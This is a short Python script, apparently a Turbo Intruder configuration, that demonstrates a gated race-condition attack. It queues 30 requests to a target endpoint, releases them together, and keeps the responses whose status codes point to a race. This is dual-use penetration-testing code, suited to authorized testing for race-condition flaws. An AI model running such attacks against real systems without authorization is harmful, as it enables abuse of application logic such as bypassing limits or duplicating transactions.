# Demo: baseline gated race attack using one gate.
CONCURRENT_CONNECTIONS = 20
REQUESTS_PER_CONNECTION = 200
RACE_GATE_NAME = "race-1"
RACE_REQUEST_COUNT = 30
COMPLETE_TIMEOUT_SECONDS = 20
KEEP_STATUS_CODES = [200, 201, 202, 409, 429, 500]


def queue_requests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrent_connections=CONCURRENT_CONNECTIONS,
        requests_per_connection=REQUESTS_PER_CONNECTION,
        pipeline=False,
        engine=Engine.HTTP,
    )

    for i in range(0, RACE_REQUEST_COUNT):
        engine.queue(target.req, str(i), gate=RACE_GATE_NAME, label="race")

    engine.open_gate(RACE_GATE_NAME)
    engine.complete(COMPLETE_TIMEOUT_SECONDS)


# Keep race-relevant status codes.
def handle_response(req, interesting):
    if req.status in KEEP_STATUS_CODES:
        table.add(req)
